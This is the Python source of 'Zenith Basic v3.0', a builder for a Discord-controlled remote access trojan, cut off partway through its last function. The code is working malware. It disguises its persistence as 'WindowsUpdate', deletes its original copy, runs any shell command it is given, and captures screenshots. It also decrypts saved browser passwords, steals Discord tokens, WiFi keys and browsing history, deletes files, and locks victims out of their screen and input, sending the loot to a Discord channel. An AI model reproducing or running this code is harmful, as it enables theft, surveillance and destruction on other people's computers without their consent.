import os
import sys
import time

import subprocess
import sys as _sys


def _ensure_builder_deps():
    try:
        import colorama
        import fade
        return
    except ImportError:
        pass
    print("Installing builder dependencies (colorama, fade, pyinstaller)...")
    pkgs = "colorama fade discord.py pywin32 pycryptodome opencv-python psutil GPUtil requests pyinstaller appdirs"
    try:
        subprocess.check_call([_sys.executable, "-m", "pip", "install", *pkgs.split(), "--quiet"])
    except Exception as e:
        print(f"Warning: failed to auto-install builder deps: {e}")

_ensure_builder_deps()

from colorama import init, Fore, Style

import fade

def print_banner():
    banner = """
                _ _   _     
  _______ _ __ (_) |_| |__  
 |_  / _ \ '_ \| | __| '_ \ 
  / /  __/ | | | | |_| | | |
 /___\___|_| |_|_|\__|_| |_|
                                                                 
                                                                      Zenith Basic v3.0"""
    
    print()
    faded_banner = fade.water(banner)
    print(faded_banner)

def main():
    init()
    print_banner()
    
    python_exe = f'"{sys.executable}"'
    
    print(f"{Fore.CYAN}Checking / installing required packages (this may take a minute the first time)...")
    os.environ['PYTHONIOENCODING'] = 'utf-8'
    rat_packages = "discord.py[voice] pywin32 pycryptodome opencv-python psutil GPUtil requests appdirs pyaudio mss Pillow nuitka"
    pip_result = os.system(f"{python_exe} -m pip install {rat_packages} --upgrade --force-reinstall --no-warn-script-location -q")
    if pip_result != 0:
        print(f"{Fore.YELLOW}Warning: pip install returned code {pip_result}. Continuing anyway...")
    
    os.system("cls")
    print_banner()
    
    token = input(f"{Fore.GREEN}paste your discord bot token here: {Style.RESET_ALL}")
    
    exe_name = input(f"{Fore.GREEN}Enter name for the final executable (without .exe) [default: client]: {Style.RESET_ALL}").strip()
    if not exe_name:
        exe_name = "client"

    startup_name = input(f"{Fore.GREEN}Enter name to use in startup (registry / scheduled task) [default: WindowsUpdate]: {Style.RESET_ALL}").strip()
    if not startup_name:
        startup_name = "WindowsUpdate"
    
    print(f"\n{Fore.YELLOW}starting building process")
    time.sleep(1)
    
    code = f"""TOKEN = '{token}'
STARTUP_NAME = '{startup_name}'

import sys
import importlib.util
_original = importlib.util.decode_source
def _safe_decode(b):
    try: return _original(b)
    except UnicodeDecodeError: return b.decode('utf-8', errors='replace')
importlib.util.decode_source = _safe_decode

"""

    code = code + r"""
import sys
if "--blockscreen" in sys.argv:
    import tkinter as tk
    import ctypes
    import os
    import time
    unblock_flag = os.path.join(os.getenv("TEMP"), "unblock.flag")
    ctypes.windll.user32.BlockInput(True)
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.configure(bg="black")
    root.attributes("-topmost", True)
    root.overrideredirect(True)
    def keep_blocking():
        ctypes.windll.user32.BlockInput(True)
        if os.path.exists(unblock_flag):
            try:
                ctypes.windll.user32.BlockInput(False)
                os.remove(unblock_flag)
            except:
                pass
            root.destroy()
            return
        root.after(600, keep_blocking)
    root.after(600, keep_blocking)
    root.mainloop()
    sys.exit()

import base64, hashlib, zlib, platform
_SALT = hashlib.sha256(b"ZenithRAT_Salt_v2_" + platform.node().encode()).digest()[:16]
def _xor(data: bytes, key: bytes) -> bytes:
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
def _s(e: str) -> str:
    try:
        data = base64.b64decode(e)
        x = _xor(data, _SALT)
        return zlib.decompress(x).decode('utf-8', errors='ignore')
    except:
        return ""
"""
    code = code + r"""import discord, platform, asyncio, tempfile, os, re, subprocess, datetime, ctypes, psutil, sys, winreg, sqlite3, threading, requests, random, time, json, base64, shutil, win32crypt, webbrowser
from discord.ext import commands
from ctypes import windll
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
import GPUtil
import cv2
from Crypto.Cipher import AES


def delete_self(original_path):
    try:
        kernel32 = ctypes.windll.kernel32
        MoveFileExW = kernel32.MoveFileExW
        MoveFileExW.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_uint32]
        MoveFileExW.restype = ctypes.c_bool
        MOVEFILE_DELAY_UNTIL_REBOOT = 0x00000004
        if MoveFileExW(original_path, None, MOVEFILE_DELAY_UNTIL_REBOOT):
            return
    except:
        pass

    try:
        os.remove(original_path)
        return
    except:
        pass

    try:
        bat = os.path.join(tempfile.gettempdir(), "del_" + str(random.randint(1000,9999)) + ".bat")
        with open(bat, "w") as f:
            f.write('@echo off\n')
            f.write('timeout /t 8 /nobreak >nul 2>&1\n')
            f.write('del /f /q "' + original_path + '" >nul 2>&1\n')
            f.write('del /f /q "%~f0" >nul 2>&1\n')
        subprocess.Popen(['cmd', '/c', bat], shell=True, creationflags=0x08000000)
    except:
        pass


def install_persistence():

    try:
        if getattr(sys, 'frozen', False):
            current_path = sys.executable
        else:
            current_path = os.path.abspath(__file__)


        appdata = os.getenv("APPDATA")
        persist_dir = os.path.join(appdata, "Microsoft", "Windows", STARTUP_NAME)
        os.makedirs(persist_dir, exist_ok=True)
        subprocess.run(f'attrib +h "{os.path.dirname(persist_dir)}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        persist_path = os.path.join(persist_dir, f"{STARTUP_NAME}.exe")

        is_original = os.path.abspath(current_path).lower() != os.path.abspath(persist_path).lower()

        if is_original:

            try:
                shutil.copy2(current_path, persist_path)
                subprocess.run(f'attrib +h +s "{persist_path}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass

            # Only one reliable startup method to avoid double execution
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, STARTUP_NAME, 0, winreg.REG_SZ, f'"{persist_path}"')
            except:
                pass

            try:
                delete_self(current_path)
            except:
                pass

    except:
        pass



class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ('biSize', ctypes.c_uint32),
        ('biWidth', ctypes.c_int),
        ('biHeight', ctypes.c_int),
        ('biPlanes', ctypes.c_short),
        ('biBitCount', ctypes.c_short),
        ('biCompression', ctypes.c_uint32),
        ('biSizeImage', ctypes.c_uint32),
        ('biXPelsPerMeter', ctypes.c_long),
        ('biYPelsPerMeter', ctypes.c_long),
        ('biClrUsed', ctypes.c_uint32),
        ('biClrImportant', ctypes.c_uint32)
    ]

loop = asyncio.ProactorEventLoop()
asyncio.set_event_loop(loop)

prefix = "$"
intents = discord.Intents.all()

class CustomHelpCommand(commands.HelpCommand):
    async def send_bot_help(self, mapping):
        embed = discord.Embed(
            title="Available Commands",
            color=discord.Color.blue()
        )

        commands_list = []
        for cog, cmds in mapping.items():
            filtered = await self.filter_commands(cmds, sort=True)
            for cmd in filtered:
                brief = cmd.brief or "No description"
                commands_list.append(f"`{prefix}{cmd.name}` - {brief}")

        commands_list.sort(key=lambda x: x.lower())
        if commands_list:
            embed.description = "\n".join(commands_list)
        else:
            embed.description = "No commands available."

        embed.set_footer(text=f"Use {prefix}help <command> for more info.")
        await self.get_destination().send(embed=embed)

    async def send_command_help(self, command):
        embed = discord.Embed(
            title=f"${command.name}",
            description=command.description or command.brief or "No description available.",
            color=discord.Color.green()
        )
        if command.aliases:
            embed.add_field(name="Aliases", value=", ".join(command.aliases), inline=False)
        usage = f"{prefix}{command.name}"
        if command.usage:
            usage = command.usage
        embed.add_field(name="Usage", value=f"`{usage}`", inline=False)
        await self.get_destination().send(embed=embed)

class Bot(commands.Bot):
    async def setup_hook(self):
        await self.tree.sync()

    async def on_ready(self):
        print(f"Logged in as {self.user}")
        

        cpu = platform.processor()
        gpu = None
        try:
            gpus = GPUtil.getGPUs()
            gpu = gpus[0].name if gpus else "No GPU detected"
        except:
            gpu = "Unable to detect GPU"
            
        ip = "Hidden for privacy"
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        

        has_webcam = False
        try:
            webcam = cv2.VideoCapture(0)
            if webcam.isOpened():
                has_webcam = True
                webcam.release()
        except:
            pass


        embed = discord.Embed(
            title="PC Information",
            description="Connected system details:",
            color=discord.Color.blue(),
            timestamp=datetime.datetime.now()
        )
        
        embed.add_field(name="CPU", value=cpu, inline=False)
        embed.add_field(name="GPU", value=gpu, inline=False)
        embed.add_field(name="Admin Rights", value="Yes" if is_admin else "No", inline=True)
        embed.add_field(name="Webcam", value="Detected" if has_webcam else "Not detected", inline=True)
        embed.set_footer(text=f"Bot connected successfully")


        for guild in self.guilds:
            for channel in guild.text_channels:
                try:
                    await channel.send(embed=embed)
                    break
                except:
                    continue
            break

bot = Bot(command_prefix=prefix, intents=intents, help_command=CustomHelpCommand())
bot.allowed_channel_ids = {} 

screen_blocker = None

@bot.check
async def check_channel(ctx):
    if ctx.command and ctx.command.name == "help":
        return True
    if ctx.guild is None:
        return False
    guild_id = str(ctx.guild.id)
    if guild_id not in bot.allowed_channel_ids:
        return False
    return ctx.channel.id == bot.allowed_channel_ids[guild_id]

@bot.event
async def on_connect():
    if not bot.guilds:
        print("Warning: Bot is not a member of any guilds yet.")
        return
    try:
        guild = bot.guilds[0]
        pc_name = platform.node()
        session_channel_name = f"session-{pc_name}"

        # Look for existing session channel for this PC
        existing_channel = discord.utils.get(guild.text_channels, name=session_channel_name)

        if existing_channel:
            # Reuse existing live session
            bot.allowed_channel_ids[str(guild.id)] = existing_channel.id
            try:
                await existing_channel.send(f"Reconnected to existing session for {pc_name}.")
            except:
                pass
            return

        # No existing session — create new one
        category = discord.utils.get(guild.categories, name="Sessions")
        if category is None:
            category = await guild.create_category("Sessions")

        channel = await guild.create_text_channel(session_channel_name, category=category)
        bot.allowed_channel_ids[str(guild.id)] = channel.id
        await channel.send(f"New session started for {pc_name}. Commands will only work in this channel.")
    except Exception as e:
        print(f"Failed to create session channel: {e}")

@bot.event
async def on_session_connect(guild_id, session_id):

    guild = bot.get_guild(guild_id)
    if guild:
        channel_name = f'session-{session_id}'
        channel = await guild.create_text_channel(channel_name)
        bot.allowed_channel_ids[session_id] = channel.id
        bot.allowed_channel_ids[str(guild.id) + "_" + str(bot.user.id)] = channel.id
        return channel

@bot.command(brief="Gets the computer's IP address.")
async def ip(ctx):
    await send_subprocess(ctx, "curl http://ipinfo.io/ip -s")

@bot.command(brief="Shows a list of all visible networks.")
async def network(ctx):
    await send_subprocess(ctx, "netsh wlan show network")

@bot.command(brief="Gets information about the current user.")
async def user(ctx):
    await send_subprocess(ctx, "net user %username%")

@bot.command(brief="Runs a command or program.")
async def run(ctx, command):
    await send_subprocess(ctx, command)

@bot.command(brief="Runs a PowerShell command.")
async def ps(ctx, command):
    await send_subprocess(ctx, "@PowerShell " + command)

@bot.command(brief="Lists all processes.")
async def tasklist(ctx):
    await send_subprocess(ctx, "tasklist")

@bot.command(brief="Forcefully kills a process.")
async def kill(ctx, process):
    await send_subprocess(ctx, "taskkill /f /im " + process)

@bot.command(brief="Lists files in directory.")
async def tree(ctx, path=os.path.expanduser("~")):
    await send_subprocess(ctx, 'tree /f /a "' + path + '"')

@bot.command(brief="Gets clipboard content.")
async def clipboard(ctx):
    await send_subprocess(ctx, "@PowerShell Get-Clipboard")

@bot.command(brief="Lists connected drives.")
async def drives(ctx):
    await send_subprocess(ctx, "wmic logicaldisk get caption, volumename, freespace, size")

@bot.command(brief="Types text.")
async def type(ctx, *, text):
    escaped_text = text.replace("'", "''")
    command = f'''@PowerShell Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{escaped_text}')'''
    
    await send_subprocess(ctx, command)
    await save_out(ctx, f"Typed: {text}")

@bot.command(brief="Grabs Discord token.")
async def token(ctx):
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
        "Discord": roaming + "\\Discord",
        "Discord Canary": roaming + "\\discordcanary",
        "Discord PTB": roaming + "\\discordptb",
        "Chrome": local + "\\Google\\Chrome\\User Data\\Default",
        "Opera": roaming + "\\Opera Software\\Opera Stable",
        "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default"
    }
    msg = ""
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        msg += f"\n{platform}:\n\n"
        tokens = grab_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                msg += f"{token}\n"
        else:
            msg += "No tokens found."
    await save_out(ctx, msg.strip())

@bot.command(brief="Takes a screenshot.", description="Takes a screenshot of the entire screen.")
async def screenshot(ctx):
    ps_script = '''
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $tempPng = Join-Path $env:TEMP "screenshot.png"
    $bitmap.Save($tempPng, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()
    '''
    
    script_path = None
    try:
        script_path = os.path.join(tempfile._get_default_tempdir(), "screenshot.ps1")
        with open(script_path, "w") as f:
            f.write(ps_script)
        
        await send_subprocess(ctx, f'powershell -ExecutionPolicy Bypass -File "{script_path}"')
        
        tempPng = os.path.join(tempfile.gettempdir(), "screenshot.png")
        if os.path.exists(tempPng):
            embed = discord.Embed(
                title="Screenshot",
                description="Screenshot taken at " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                color=discord.Color.purple()
            )
            await ctx.send(embed=embed, file=discord.File(tempPng))
            
            try:
                os.remove(tempPng)
            except:
                pass
        else:
            await ctx.send("Failed to capture screenshot.")
            
    except Exception as e:
        await ctx.send(f"Error taking screenshot: {str(e)}")
    finally:
        if script_path and os.path.exists(script_path):
            os.remove(script_path)

async def send_subprocess(ctx, command):
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE

    proc = await asyncio.subprocess.create_subprocess_shell(
        command, 
        stdout=asyncio.subprocess.PIPE, 
        stderr=subprocess.STDOUT,
        startupinfo=startupinfo
    )
    stdout = (await proc.communicate())[0]
    output = stdout.decode(errors="ignore")
    
    embed = discord.Embed(
        title="Command Output",
        description=f"```{output[:2000]}```" if output else "No output",
        color=discord.Color.blue()
    )
    embed.set_footer(text=f"Command: {command}")
    
    if len(output) > 2000:
        filename = os.path.join(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()) + ".txt")
        with open(filename, "w+", encoding="utf-8") as file:
            file.write(output)
        await ctx.send(embed=embed, file=discord.File(filename))
        os.remove(filename)
    else:
        await ctx.send(embed=embed)

async def save_out(ctx, text):
    embed = discord.Embed(
        title="Output",
        description=f"```{text[:2000]}```" if text else "No output",
        color=discord.Color.green()
    )
    
    if len(text) > 2000:
        filename = os.path.join(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()) + ".txt")
        with open(filename, "w+", encoding="utf-8") as file:
            file.write(text)
        await ctx.send(embed=embed, file=discord.File(filename))
        os.remove(filename)
    else:
        await ctx.send(embed=embed)

def grab_tokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

@bot.command(brief="Gets system information.")
async def sysinfo(ctx):
    cpu = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    boot_time = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
    
    embed = discord.Embed(
        title="System Information",
        color=discord.Color.blue()
    )
    embed.add_field(name="CPU Usage", value=f"{cpu}%", inline=True)
    embed.add_field(name="Memory Usage", value=f"{memory.percent}%", inline=True)
    embed.add_field(name="Disk Usage", value=f"{disk.percent}%", inline=True)
    embed.add_field(name="Boot Time", value=boot_time, inline=False)
    embed.add_field(name="System", value=platform.system(), inline=True)
    embed.add_field(name="Machine", value=platform.machine(), inline=True)
    embed.add_field(name="Node", value=platform.node(), inline=True)
    
    await ctx.send(embed=embed)

@bot.command(brief="Shuts down the computer.")
async def shutdown(ctx):
    await ctx.send("Shutting down...")
    os.system("shutdown /s /t 0")

@bot.command(brief="Restarts the computer.")
async def restart(ctx):
    await ctx.send("Restarting...")
    os.system("shutdown /r /t 0")

@bot.command(brief="Puts computer to sleep.")
async def sleep(ctx):
    await ctx.send("Going to sleep...")
    os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")

@bot.command(brief="Gets active window title.")
async def active_window(ctx):
    await send_subprocess(ctx, '@PowerShell Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Form]::ActiveForm.Text')

@bot.command(brief="Adds program to startup.")
async def startup(ctx, *, path=None):
    if not path:
        path = os.path.abspath(sys.argv[0])
    
    success_methods = []
    

    try:
        key = winreg.HKEY_CURRENT_USER
        key_paths = [
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
            r"Software\Microsoft\Windows NT\CurrentVersion\Windows\load"
        ]
        
        for key_path in key_paths:
            try:
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as registry_key:
                    winreg.SetValueEx(registry_key, "Windows Update", 0, winreg.REG_SZ, f'"{path}"')
                success_methods.append(f"Registry: {key_path}")
            except:
                continue
    except:
        pass


    try:
        task_name = "WindowsUpdateScheduler"
        command = f'schtasks /create /tn "{task_name}" /tr "{path}" /sc onlogon /rl LIMITED'
        subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        success_methods.append("Scheduled Task")
    except:
        pass


    try:
        startup_folder = os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        shortcut_path = os.path.join(startup_folder, "Windows Update.lnk")
        
        vbs_script = f'''
Set ws = CreateObject("WScript.Shell")
Set shortcut = ws.CreateShortcut("{shortcut_path}")
shortcut.TargetPath = "{path}"
shortcut.WorkingDirectory = "{os.path.dirname(path)}"
shortcut.WindowStyle = 7
shortcut.IconLocation = "shell32.dll,13"
shortcut.Save
'''
        
        vbs_path = os.path.join(tempfile._get_default_tempdir(), "create_shortcut.vbs")
        with open(vbs_path, "w") as f:
            f.write(vbs_script)
            
        subprocess.run(f'wscript "{vbs_path}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        os.remove(vbs_path)
        success_methods.append("Startup Folder")
    except:
        pass


    try:
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows NT\CurrentVersion\Windows"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as registry_key:
            winreg.SetValueEx(registry_key, "Shell", 0, winreg.REG_SZ, f'explorer.exe,"{path}"')
        success_methods.append("Shell Startup")
    except:
        pass

    if success_methods:
        await ctx.send(f"Added to startup using methods: {', '.join(success_methods)}")
    else:
        await ctx.send("Failed to add to startup")

@bot.command(brief="Removes program from startup.")
async def remove_startup(ctx):
    removed_methods = []
    

    try:
        key = winreg.HKEY_CURRENT_USER
        key_paths = [
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
            r"Software\Microsoft\Windows NT\CurrentVersion\Windows\load"
        ]
        
        for key_path in key_paths:
            try:
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as registry_key:
                    winreg.DeleteValue(registry_key, "Windows Update")
                removed_methods.append(f"Registry: {key_path}")
            except:
                continue
    except:
        pass


    try:
        task_name = "WindowsUpdateScheduler"
        subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        removed_methods.append("Scheduled Task")
    except:
        pass


    try:
        startup_folder = os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        shortcut_path = os.path.join(startup_folder, "Windows Update.lnk")
        if os.path.exists(shortcut_path):
            os.remove(shortcut_path)
            removed_methods.append("Startup Folder")
    except:
        pass

    try:
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows NT\CurrentVersion\Windows"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as registry_key:
            current_shell = winreg.QueryValueEx(registry_key, "Shell")[0]
            if "," in current_shell:
                new_shell = "explorer.exe"
                winreg.SetValueEx(registry_key, "Shell", 0, winreg.REG_SZ, new_shell)
                removed_methods.append("Shell Startup")
    except:
        pass

    if removed_methods:
        await ctx.send(f"Removed from startup methods: {', '.join(removed_methods)}")
    else:
        await ctx.send("No startup entries found to remove")

@bot.command(brief="Gets WiFi passwords.")
async def wifi_passwords(ctx):
    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp1252', errors='ignore').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        
        embed = discord.Embed(title="WiFi Passwords", color=discord.Color.green())
        
        for profile in profiles:
            try:
                results = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
                ).decode('cp1252', errors='ignore').split('\n')
                
                password = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                if password:
                    embed.add_field(
                        name=profile,
                        value=f"Password: {password[0]}",
                        inline=False
                    )
            except subprocess.CalledProcessError:
                continue
            except IndexError:
                continue
        
        if len(embed.fields) == 0:
            await ctx.send("No WiFi profiles found.")
        else:
            await ctx.send(embed=embed)
            
    except Exception as e:
        await ctx.send(f"Error retrieving WiFi passwords: {str(e)}")

@bot.command(brief="Gets browser history.")
async def history(ctx):
    try:

        chrome_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default\History"
        edge_path = os.path.expanduser('~') + r"\AppData\Local\Microsoft\Edge\User Data\Default\History"
        
        history_data = []
        

        def get_browser_history(db_path, browser_name):
            if not os.path.exists(db_path):
                return []
                
            temp_history = os.path.join(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()))
            os.system(f'copy "{db_path}" "{temp_history}" > nul 2>&1')
            
            try:
                conn = sqlite3.connect(temp_history)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                results = cursor.fetchall()
                conn.close()
                os.remove(temp_history)
                return [(browser_name, url, title, last_visit_time) for url, title, last_visit_time in results]
            except:
                if os.path.exists(temp_history):
                    os.remove(temp_history)
                return []
        

        history_data.extend(get_browser_history(chrome_path, "Chrome"))
        history_data.extend(get_browser_history(edge_path, "Edge"))
        

        history_data.sort(key=lambda x: x[3], reverse=True)
        
        history_file = os.path.join(tempfile._get_default_tempdir(), "browser_history.txt")
        with open(history_file, "w", encoding="utf-8") as f:
            f.write("Browser History\n\n")
            for browser, url, title, timestamp in history_data:

                timestamp_seconds = timestamp / 1000000 - 11644473600
                date = datetime.datetime.fromtimestamp(timestamp_seconds).strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"[{browser}] {date}\n")
                f.write(f"Title: {title}\n")
                f.write(f"URL: {url}\n\n")
        
        await ctx.send(file=discord.File(history_file))
        os.remove(history_file)
            
    except Exception as e:
        await ctx.send(f"Error retrieving browser history: {str(e)}")

@bot.command(brief="Spams opening a website in the victim's browser.")
async def spam_site(ctx, url: str, amount: int = 100):
    try:
        if not url.startswith(("http://", "https://")):
            url = "https://" + url

        await ctx.send(f"Spamming {url} ({amount} browser opens)...")

        def do_spam():
            for _ in range(amount):
                try:
                    subprocess.Popen(
                        f'start "" "{url}"',
                        shell=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    time.sleep(0.05)
                except:
                    pass

        threading.Thread(target=do_spam, daemon=True).start()

    except Exception as e:
        await ctx.send(f"Error spamming site: {str(e)}")

def get_master_key():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except: 
        return None
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

def decrypt_password_edge(buff, master_key):
    try:
        iv = buff[3:15]
        ciphertext = buff[15:-16]
        tag = buff[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted_pass.decode()
    except Exception:
        try:
            return str(win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1])
        except:
            return ""

def get_passwords_edge():
    master_key = get_master_key()
    if not master_key:
        return {}
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
    try: 
        shutil.copy2(login_db, "Loginvault.db")
    except: 
        return {}
    
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    result = {}

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password_edge(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                result[url] = [username, decrypted_password]
    except: 
        pass

    cursor.close()
    conn.close()
    try: 
        os.remove("Loginvault.db")
    except: 
        pass
    return result

def get_encryption_key():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except: 
        return None

def decrypt_password_chrome(password, key):
    try:
        iv = password[3:15]
        ciphertext = password[15:-16]
        tag = password[-16:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted.decode()
    except:
        try: 
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except: 
            return ""

def get_chrome_passwords():
    key = get_encryption_key()
    if not key:
        return {}
        
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    file_name = "ChromeData.db"
    try:
        shutil.copyfile(db_path, file_name)
    except:
        return {}
        
    db = sqlite3.connect(file_name)
    cursor = db.cursor()
    result = {}
    
    try:
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            action_url = row[1]
            username = row[2]
            password = decrypt_password_chrome(row[3], key)
            if username or password:
                result[action_url] = [username, password]
    except:
        pass
        
    cursor.close()
    db.close()
    try: 
        os.remove(file_name)
    except: 
        pass
    return result

def grab_passwords():
    result = {}
    

    chrome_results = get_chrome_passwords()
    result.update(chrome_results)
    

    edge_results = get_passwords_edge()
    result.update(edge_results)
    
    return result

@bot.command(brief="Grabs saved passwords from browsers")
async def grabpassword(ctx):
    try:
        passwords = grab_passwords()
        
        if not passwords:
            await ctx.send("No passwords found!")
            return
            

        text = "Saved Passwords:\n\n"
        for url, (username, password) in passwords.items():
            text += f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n"
            

        with open("passwords.txt", "w", encoding="utf-8") as f:
            f.write(text)
            

        await ctx.send(file=discord.File("passwords.txt"))
        

        os.remove("passwords.txt")
        
    except Exception as e:
        await ctx.send(f"Error grabbing passwords: {str(e)}")



@bot.command(brief="Upload a file from Discord to the victim's PC (attachment only).")
async def upload(ctx):
    await ctx.send("Send the file as a Discord attachment now.")
    def check(m):
        return m.author == ctx.author and len(m.attachments) > 0
    try:
        msg = await bot.wait_for('message', check=check, timeout=60.0)
        att = msg.attachments[0]
        downloads = os.path.join(os.path.expanduser("~"), "Downloads")
        os.makedirs(downloads, exist_ok=True)
        filepath = os.path.join(downloads, att.filename)
        await att.save(filepath)
        await ctx.send(f"File downloaded to: `{filepath}`")
    except asyncio.TimeoutError:
        await ctx.send("Timed out waiting for file upload.")

@bot.command(brief="Permanently delete a file from the victim's PC (including Recycle Bin).")
async def delete(ctx, *, path: str):
    user_profile = os.path.expanduser("~")
    search_dirs = [
        os.path.join(user_profile, "Downloads"),
        os.path.join(user_profile, "Desktop"),
        os.path.join(user_profile, "Documents"),
        os.path.join(user_profile, "Pictures"),
        os.path.join(user_profile, "Videos"),
        user_profile,
    ]

    found_path = None

    # First try exact path
    if os.path.exists(path):
        found_path = path
    else:
        # Treat as filename and search common locations
        for directory in search_dirs:
            if not os.path.exists(directory):
                continue
            for root, dirs, files in os.walk(directory):
                for f in files:
                    if f.lower() == path.lower():
                        found_path = os.path.join(root, f)
                        break
                if found_path:
                    break
            if found_path:
                break

    if not found_path:
        await ctx.send(f"Could not find `{path}` (searched common folders).")
        return

    try:
        os.remove(found_path)
        import ctypes
        ctypes.windll.shell32.SHEmptyRecycleBinW(None, None, 0x00000001 | 0x00000002 | 0x00000004)
        await ctx.send(f"Permanently deleted: `{found_path}` (including Recycle Bin)")
    except Exception as e:
        await ctx.send(f"Error deleting file: {e}")


@bot.command(brief="Block the victim's screen and disable keyboard/mouse input.")
async def blockscreen(ctx):
    try:
        exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        subprocess.Popen([exe, "--blockscreen"], creationflags=0x08000000 | 0x00000008)
        await ctx.send("Screen blocked aggressively.")
    except Exception as e:
        await ctx.send(f"Error: {e}")


@bot.command(brief="Unblock screen and restore input.")
async def unblockscreen(ctx):
    try:
        import ctypes
